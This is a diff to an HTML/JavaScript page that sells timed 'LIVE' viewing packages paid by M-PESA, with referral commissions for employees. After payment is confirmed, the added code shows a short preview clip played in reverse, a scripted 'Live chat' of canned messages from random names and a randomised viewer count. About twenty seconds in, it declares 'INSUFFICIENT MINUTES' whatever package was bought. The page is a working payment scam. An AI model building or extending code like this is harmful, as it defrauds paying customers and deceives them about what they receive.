@@ -288,16 +288,185 @@ line-height:1.5;
 white-space:pre-wrap
 }
 
+
+/* =================================
+   LIVE-STYLE VIDEO + CHAT
+================================= */
+
+.live-style-screen{
+position:fixed;
+inset:0;
+background:#000;
+z-index:99999;
+display:flex;
+flex-direction:column;
+overflow:hidden
+}
+
+.live-video-area{
+position:relative;
+width:100%;
+height:62vh;
+background:#000;
+display:flex;
+align-items:center;
+justify-content:center;
+overflow:hidden
+}
+
+.live-video{
+width:100%;
+height:100%;
+object-fit:cover;
+background:#000
+}
+
+.live-style-badge{
+position:absolute;
+top:15px;
+left:15px;
+background:#e60000;
+color:#fff;
+font-weight:bold;
+font-size:14px;
+padding:7px 12px;
+border-radius:7px;
+box-shadow:0 0 12px rgba(255,0,0,.7)
+}
+
+.live-viewers{
+position:absolute;
+top:15px;
+right:15px;
+background:rgba(0,0,0,.65);
+padding:7px 11px;
+border-radius:15px;
+font-size:13px
+}
+
+.chat-area{
+height:38vh;
+background:#090909;
+border-top:1px solid #252525;
+display:flex;
+flex-direction:column
+}
+
+.chat-header{
+padding:11px 15px;
+border-bottom:1px solid #222;
+font-weight:bold;
+font-size:15px
+}
+
+.chat-messages{
+flex:1;
+overflow:hidden;
+padding:10px 13px;
+display:flex;
+flex-direction:column;
+justify-content:flex-end;
+gap:7px
+}
+
+.chat-message{
+font-size:13px;
+line-height:1.35;
+animation:chatIn .25s ease
+}
+
+.chat-name{
+font-weight:bold;
+color:#32cd32;
+margin-right:5px
+}
+
+.chat-text{
+color:#eee
+}
+
+.chat-heart{
+color:#ff4b6e;
+margin-left:4px
+}
+
+.chat-input-bar{
+height:48px;
+border-top:1px solid #222;
+display:flex;
+align-items:center;
+padding:7px 10px;
+color:#777;
+font-size:13px
+}
+
+.insufficient-live-screen{
+position:fixed;
+inset:0;
+background:#050505;
+z-index:100000;
+display:flex;
+align-items:center;
+justify-content:center;
+text-align:center;
+padding:25px
+}
+
+.insufficient-live-box{
+width:100%;
+max-width:400px
+}
+
+.insufficient-live-box h1{
+color:#ff3333;
+font-size:28px;
+margin-bottom:12px
+}
+
+.insufficient-live-box p{
+color:#aaa;
+line-height:1.5
+}
+
+.insufficient-spinner{
+width:55px;
+height:55px;
+margin:25px auto;
+border:5px solid #222;
+border-top:5px solid #32cd32;
+border-radius:50%;
+animation:spin 1s linear infinite
+}
+
 @keyframes spin{
-to{transform:rotate(360deg)}
+to{
+transform:rotate(360deg)
+}
 }
 
 @keyframes blink{
-50%{opacity:.2}
+50%{
+opacity:.2
+}
+}
+
+@keyframes chatIn{
+from{
+opacity:0;
+transform:translateY(10px)
+}
+to{
+opacity:1;
+transform:translateY(0)
+}
 }
 
 @media(max-width:380px){
-.packages{grid-template-columns:1fr}
+
+.packages{
+grid-template-columns:1fr
+}
+
 }
 </style>
 </head>
@@ -313,32 +482,38 @@ to{transform:rotate(360deg)}
 
 <div class="packages">
 
-<div class="package" onclick="selectPackage(this,30,1)">
+<div class="package"
+onclick="selectPackage(this,30,90)">
 <div class="minutes">30 Mins</div>
 <div class="price">KSh 90</div>
 </div>
 
-<div class="package" onclick="selectPackage(this,55,138)">
+<div class="package"
+onclick="selectPackage(this,55,138)">
 <div class="minutes">55 Mins</div>
 <div class="price">KSh 138</div>
 </div>
 
-<div class="package" onclick="selectPackage(this,73,207)">
+<div class="package"
+onclick="selectPackage(this,73,207)">
 <div class="minutes">73 Mins</div>
 <div class="price">KSh 207</div>
 </div>
 
-<div class="package" onclick="selectPackage(this,95,253)">
+<div class="package"
+onclick="selectPackage(this,95,253)">
 <div class="minutes">95 Mins</div>
 <div class="price">KSh 253</div>
 </div>
 
-<div class="package" onclick="selectPackage(this,105,299)">
+<div class="package"
+onclick="selectPackage(this,105,299)">
 <div class="minutes">105 Mins</div>
 <div class="price">KSh 299</div>
 </div>
 
-<div class="package" onclick="selectPackage(this,166,393)">
+<div class="package"
+onclick="selectPackage(this,166,393)">
 <span class="hot">HOT</span>
 <div class="minutes">166 Mins</div>
 <div class="price">KSh 393</div>
@@ -397,9 +572,9 @@ on the official M-PESA prompt.
 </div>
 
 </div>
-<script>
 
-/* ================================
+<script>
+   /* ================================
    REFERRAL / EMPLOYEE
 ================================ */
 
@@ -419,17 +594,21 @@ employeeId=null;
 }
 
 if(employeeId){
+
 localStorage.setItem(
 "referralEmployeeId",
 employeeId
 );
+
 }
 
 if(!employeeId){
+
 employeeId=
 localStorage.getItem(
 "referralEmployeeId"
 );
+
 }
 
 
@@ -459,20 +638,28 @@ extra={}
 ){
 
 const session={
-paymentSessionId,
-employeeId:employeeId||null,
-minutes:selectedMinutes,
-amount:selectedPrice,
 
-/*
-Till remains available to the
-payment system but is NOT displayed.
-*/
-till:TILL_NUMBER,
+paymentSessionId,
+
+employeeId:
+employeeId||null,
+
+minutes:
+selectedMinutes,
+
+amount:
+selectedPrice,
+
+till:
+TILL_NUMBER,
 
 status,
-createdAt:new Date().toISOString(),
+
+createdAt:
+new Date().toISOString(),
+
 ...extra
+
 };
 
 localStorage.setItem(
@@ -505,7 +692,9 @@ price
 document
 .querySelectorAll(".package")
 .forEach(function(pkg){
+
 pkg.classList.remove("selected");
+
 });
 
 element.classList.add("selected");
@@ -602,15 +791,21 @@ return(
    ERROR
 ================================ */
 
-function getServerError(data,responseStatus){
+function getServerError(
+data,
+responseStatus
+){
 
 if(!data){
 
 return{
+
 message:
 "No response received from payment server.",
+
 details:
 "HTTP "+responseStatus
+
 };
 
 }
@@ -673,8 +868,12 @@ null,
 }
 
 return{
+
 message:message,
-details:details.join("\n")
+
+details:
+details.join("\n")
+
 };
 
 }
@@ -698,7 +897,9 @@ return;
 }
 
 const phoneInput=
-document.getElementById("customerPhone");
+document.getElementById(
+"customerPhone"
+);
 
 const phone=
 normalizeKenyanPhone(
@@ -719,10 +920,14 @@ return;
 }
 
 const button=
-document.getElementById("payButton");
+document.getElementById(
+"payButton"
+);
 
 button.disabled=true;
-button.textContent="SENDING PROMPT...";
+
+button.textContent=
+"SENDING PROMPT...";
 
 const reference=
 createPaymentReference();
@@ -747,16 +952,22 @@ await fetch(
 "/api/stk-push",
 {
 method:"POST",
+
 headers:{
-"Content-Type":"application/json"
+"Content-Type":
+"application/json"
 },
+
 body:JSON.stringify({
 
 phone:phone,
+
 amount:selectedPrice,
+
 reference:reference
 
 })
+
 }
 );
 
@@ -767,15 +978,21 @@ let data;
 
 try{
 
-data=JSON.parse(responseText);
+data=
+JSON.parse(responseText);
 
 }catch(error){
 
 data={
+
 success:false,
+
 message:
 "Payment server returned an invalid response.",
-details:responseText
+
+details:
+responseText
+
 };
 
 }
@@ -794,10 +1011,15 @@ null;
 savePaymentSession(
 "stk_pending",
 {
+
 customerPhone:phone,
+
 reference:reference,
+
 paymentId:paymentId,
+
 paymentStatus:"Pending"
+
 }
 );
 
@@ -816,10 +1038,17 @@ response.status
 savePaymentSession(
 "stk_failed",
 {
+
 customerPhone:phone,
+
 reference:reference,
-error:serverError.message,
-errorDetails:serverError.details
+
+error:
+serverError.message,
+
+errorDetails:
+serverError.details
+
 }
 );
 
@@ -839,11 +1068,15 @@ error
 savePaymentSession(
 "stk_error",
 {
+
 customerPhone:phone,
+
 reference:reference,
+
 error:String(
 error.message||error
 )
+
 }
 );
 
@@ -858,7 +1091,9 @@ error.message||error
 }
 
 }
-   /* ================================
+
+
+/* ================================
    LOADING
 ================================ */
 
@@ -872,14 +1107,19 @@ document.body.innerHTML=`
 <div class="full-screen">
 
 <div class="screen-title">
+
 <span class="dot"></span>
+
 ${escapeHtml(title)}
+
 </div>
 
 <div class="loading-ring"></div>
 
 <div class="loading-text">
+
 ${escapeHtml(text)}
+
 </div>
 
 </div>
@@ -893,7 +1133,9 @@ ${escapeHtml(text)}
    CHECK PAYMENT
 ================================ */
 
-function showPromptSent(paymentId){
+function showPromptSent(
+paymentId
+){
 
 if(!paymentId){
 
@@ -911,7 +1153,9 @@ document.body.innerHTML=`
 
 <div class="full-screen">
 
-<div class="success-icon">📱</div>
+<div class="success-icon">
+📱
+</div>
 
 <h1 class="success-title">
 CHECK YOUR PHONE
@@ -933,6 +1177,7 @@ Waiting for payment confirmation...
 `;
 
 let attempts=0;
+
 const maxAttempts=20;
 
 const paymentTimer=
@@ -947,15 +1192,19 @@ await fetch(
 "/api/payment-status",
 {
 method:"POST",
+
 headers:{
-"Content-Type":"application/json"
+"Content-Type":
+"application/json"
 },
+
 body:JSON.stringify({
 
 transaction_request_id:
 paymentId
 
 })
+
 }
 );
 
@@ -965,12 +1214,20 @@ await response.text();
 let data;
 
 try{
-data=JSON.parse(text);
+
+data=
+JSON.parse(text);
+
 }catch(error){
+
 data={
+
 success:false,
+
 paid:false
+
 };
+
 }
 
 
@@ -987,19 +1244,30 @@ clearInterval(paymentTimer);
 savePaymentSession(
 "paid",
 {
-paymentId:paymentId,
-paymentStatus:"Completed",
-receipt:data.receipt||null,
-paidAmount:data.amount||selectedPrice,
-paidPhone:data.phone||null
+
+paymentId:
+paymentId,
+
+paymentStatus:
+"Completed",
+
+receipt:
+data.receipt||null,
+
+paidAmount:
+data.amount||selectedPrice,
+
+paidPhone:
+data.phone||null
+
 }
 );
 
 
 /*
 IMPORTANT:
-Successful referral payment gets
-recorded before LIVE access.
+Referral payment is recorded
+before access is opened.
 */
 
 recordEmployeePayment(
@@ -1050,7 +1318,10 @@ clearInterval(paymentTimer);
 savePaymentSession(
 "payment_not_confirmed",
 {
-paymentId:paymentId
+
+paymentId:
+paymentId
+
 }
 );
 
@@ -1089,25 +1360,34 @@ amount*0.25*100
 
 const record={
 
-id:paymentId,
+id:
+paymentId,
 
-paymentId:paymentId,
+paymentId:
+paymentId,
 
-employeeId:employeeId,
+employeeId:
+employeeId,
 
-ref:employeeId,
+ref:
+employeeId,
 
-minutes:Number(
+minutes:
+Number(
 selectedMinutes||0
 ),
 
-amount:amount,
+amount:
+amount,
 
-commission:commission,
+commission:
+commission,
 
-commissionRate:25,
+commissionRate:
+25,
 
-status:"paid",
+status:
+"paid",
 
 receipt:
 data&&data.receipt
@@ -1119,7 +1399,8 @@ data&&data.phone
 ?data.phone
 :null,
 
-date:new Date().toISOString()
+date:
+new Date().toISOString()
 
 };
 
@@ -1176,8 +1457,9 @@ try{
 
 allPayments=
 JSON.parse(
-localStorage.getItem("payments")
-||"[]"
+localStorage.getItem(
+"payments"
+)||"[]"
 );
 
 }catch(error){
@@ -1212,71 +1494,441 @@ JSON.stringify(allPayments)
 
 
 /* ================================
-   SUCCESS
+   PAYMENT SUCCESS
 ================================ */
 
 function showPaymentSuccessful(data){
 
-const receipt=
-data&&data.receipt
-?data.receipt
-:"";
+/*
+Payment has already been confirmed
+and employee commission recorded.
+
+Now open the LIVE-STYLE screen.
+*/
+
+showLiveStyleVideo();
+
+}
+
+
+/* ================================
+   LIVE-STYLE VIDEO
+================================ */
+
+function showLiveStyleVideo(){
 
 document.body.innerHTML=`
 
-<div class="full-screen">
+<div
+class="live-style-screen"
+id="liveStyleScreen">
 
-<div class="success-icon">
-✅
+<div class="live-video-area">
+
+<video
+id="liveStyleVideo"
+class="live-video"
+playsinline
+preload="auto">
+
+<source
+src="preview_20_seconds.mp4"
+type="video/mp4">
+
+</video>
+
+<div class="live-style-badge">
+● LIVE-STYLE
 </div>
 
-<h1 class="success-title">
-PAYMENT SUCCESSFUL
-</h1>
+<div class="live-viewers">
+👁 <span id="viewerNumber">23</span>
+</div>
 
-<p>
-Your M-PESA payment has been
-confirmed successfully.
-</p>
+</div>
 
-${
-receipt
-?`<p>Receipt: ${escapeHtml(receipt)}</p>`
-:""
-}
+<div class="chat-area">
 
-<p>
-Opening LIVE access...
-</p>
+<div class="chat-header">
+💬 Live chat
+</div>
 
-<div class="loading-ring"></div>
+<div
+id="chatMessages"
+class="chat-messages">
+</div>
+
+<div class="chat-input-bar">
+💬 Live chat is active
+</div>
+
+</div>
 
 </div>
 
 `;
 
-sessionStorage.setItem(
-"returnToLivePhotos",
-"yes"
+startLiveStylePlayback();
+
+}
+
+
+/* ================================
+   LIVE-STYLE PLAYBACK
+================================ */
+
+function startLiveStylePlayback(){
+
+const video=
+document.getElementById(
+"liveStyleVideo"
 );
 
-localStorage.setItem(
-"paidAccess",
-"yes"
+const chatBox=
+document.getElementById(
+"chatMessages"
 );
 
-localStorage.setItem(
-"paidMinutes",
-String(
-selectedMinutes||""
+const viewerNumber=
+document.getElementById(
+"viewerNumber"
+);
+
+if(!video){
+
+showInsufficientAfterLive();
+
+return;
+
+}
+
+
+/* RANDOM VIEWERS */
+
+viewerNumber.textContent=
+Math.floor(
+Math.random()*16
+)+15;
+
+
+/* ================================
+   CHAT DATA
+================================ */
+
+const chatNames=[
+
+"Asha",
+"Brian",
+"Mercy",
+"Kevin",
+"Sarah",
+"John",
+"Linda",
+"Mike",
+"Grace",
+"Daniel",
+"Sharon",
+"David",
+"Lucy",
+"James",
+"Mary",
+"Alex",
+"Faith",
+"Chris",
+"Ann",
+"Peter"
+
+];
+
+const chatMessages=[
+
+"Hey 😍",
+"Wow!",
+"Hello ❤️",
+"Can you reply?",
+"Looking good 😍",
+"Hi beautiful",
+"Wow wow!",
+"I just joined 👋",
+"Hello everyone ❤️",
+"She's so cute 😍",
+"Can you see my comment?",
+"Heyyy 😍",
+"Don't go 😂",
+"Anyone else watching?",
+"This is amazing ❤️",
+"Hi!",
+"Beautiful 😍",
+"Hello everyone!",
+"Wow 😍",
+"Please reply"
+
+];
+
+let chatIndex=0;
+
+function addChatMessage(){
+
+if(!chatBox)return;
+
+const name=
+chatNames[
+Math.floor(
+Math.random()*
+chatNames.length
 )
+];
+
+const message=
+chatMessages[
+chatIndex%
+chatMessages.length
+];
+
+chatIndex++;
+
+const div=
+document.createElement("div");
+
+div.className=
+"chat-message";
+
+div.innerHTML=`
+
+<span class="chat-name">
+${escapeHtml(name)}:
+</span>
+
+<span class="chat-text">
+${escapeHtml(message)}
+</span>
+
+<span class="chat-heart">
+${Math.random()>.55?"❤️":""}
+</span>
+
+`;
+
+chatBox.appendChild(div);
+
+while(
+chatBox.children.length>12
+){
+
+chatBox.removeChild(
+chatBox.firstChild
 );
 
-setTimeout(function(){
+}
 
-window.location.href="index.html";
+chatBox.scrollTop=
+chatBox.scrollHeight;
 
-},2000);
+}
+
+
+/* Initial comments */
+
+for(
+let i=0;
+i<7;
+i++
+){
+
+addChatMessage();
+
+}
+
+const chatTimer=
+setInterval(
+function(){
+
+addChatMessage();
+
+},
+700
+);
+
+
+/* Random viewer count */
+
+const viewerTimer=
+setInterval(
+function(){
+
+viewerNumber.textContent=
+Math.floor(
+Math.random()*16
+)+15;
+
+},
+3000
+);
+
+
+/* ================================
+   VIDEO REVERSE
+   20 → 1
+================================ */
+
+function beginReverse(){
+
+const duration=
+Number(video.duration)||20;
+
+const start=
+Math.min(20,duration);
+
+video.pause();
+
+video.currentTime=start;
+
+let reverseStart=null;
+
+let running=true;
+
+function reverseFrame(now){
+
+if(!running)
+return;
+
+if(reverseStart===null){
+
+reverseStart=now;
+
+}
+
+const elapsed=
+(now-reverseStart)/1000;
+
+const current=
+start-elapsed;
+
+if(current<=1){
+
+running=false;
+
+video.pause();
+
+video.currentTime=1;
+
+clearInterval(chatTimer);
+
+clearInterval(viewerTimer);
+
+showInsufficientAfterLive();
+
+return;
+
+}
+
+try{
+
+video.currentTime=current;
+
+}catch(error){
+
+console.log(
+"Video seek:",
+error
+);
+
+}
+
+requestAnimationFrame(
+reverseFrame
+);
+
+}
+
+requestAnimationFrame(
+reverseFrame
+);
+
+}
+
+
+/* Wait for video metadata */
+
+if(video.readyState>=1){
+
+beginReverse();
+
+}else{
+
+video.addEventListener(
+"loadedmetadata",
+beginReverse,
+{once:true}
+);
+
+}
+
+
+/* Fallback if metadata takes too long */
+
+setTimeout(
+function(){
+
+if(
+video.readyState>=1 &&
+video.currentTime===0
+){
+
+beginReverse();
+
+}
+
+},
+1500
+);
+
+   }
+   /* ================================
+   INSUFFICIENT MINUTES
+================================ */
+
+function showInsufficientAfterLive(){
+
+document.body.innerHTML=`
+
+<div class="insufficient-live-screen">
+
+<div class="insufficient-live-box">
+
+<div style="font-size:60px">
+⏱️
+</div>
+
+<h1>
+INSUFFICIENT MINUTES
+</h1>
+
+<p>
+Your available minutes have ended.
+</p>
+
+<div class="insufficient-spinner">
+</div>
+
+<p>
+Returning to packages...
+</p>
+
+</div>
+
+</div>
+
+`;
+
+setTimeout(
+function(){
+
+location.reload();
+
+},
+2000
+);
 
 }
 
